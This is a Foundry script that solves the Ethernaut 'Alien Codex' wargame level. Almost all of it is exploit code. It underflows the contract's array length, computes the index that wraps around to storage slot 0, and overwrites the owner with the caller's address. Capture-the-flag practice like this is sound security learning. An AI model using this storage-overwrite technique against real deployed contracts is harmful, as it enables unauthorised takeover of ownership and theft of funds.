/*
You've uncovered an Alien contract. Claim ownership to complete the level.

  Things that might help

Understanding how array storage works
Understanding ABI specifications
Using a very underhanded approach


*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IAlienCodex} from "src/AlienCodex.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract AlienCodexSolution is Script {
    IAlienCodex public alienCodex = IAlienCodex(0xC44bdd4e54691f5f654b7564c1Db139EffBb2266);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        alienCodex.makeContact();
        alienCodex.retract();
        // 2**256 -1 is the last slot i the storage,
        uint256 h = uint256(keccak256(abi.encode(uint256(1)))); // index of the slot 1
        uint256 i;
        unchecked {
            // unchecked to avoid overflow check
            i -= h;
        }

        alienCodex.revise(i, bytes32(uint256(uint160(vm.envAddress("MY_ADDRESS")))));
        console.log("AlienCodex owner:", alienCodex.owner());
        vm.stopBroadcast();
    }

    fallback() external payable {}
    receive() external payable {}
}
